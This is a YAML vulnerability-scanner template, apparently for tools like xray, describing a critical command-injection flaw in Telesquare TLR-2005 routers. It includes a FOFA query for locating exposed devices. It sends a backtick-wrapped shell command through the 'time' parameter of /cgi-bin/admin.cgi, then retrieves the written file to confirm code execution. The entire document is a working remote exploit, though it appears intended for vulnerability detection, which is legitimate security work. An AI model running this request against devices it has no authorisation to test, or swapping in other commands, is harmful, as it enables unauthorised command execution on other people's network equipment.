id: poc-yaml-telesquare-tlr2005-cgi-bin-command-injection
info:
  name: telesquare tlr2005 cgi-bin 命令注入漏洞
  severity: critical
  tags:
  - 命令注入
  finger: telesquare
  fofa: app="TELESQUARE-TLR-2005KSH"
variables:
  t1: random_str(4)
requests:
- method: GET
  path: /cgi-bin/admin.cgi?Command=setSyncTimeHost&time=`id>{{.t1}}.txt`
  expression: 'status_code == 200 &&

    contains(body,"<result>success</result>") &&

    contains(content_type,"text/xml")

    '
- method: GET
  path: /cgi-bin/{{.t1}}.txt
  expression: 'status_code == 200 &&

    contains(body,"uid=") &&

    contains(body,"gid=") &&

    !contains(body,"<")

    '
transport: http
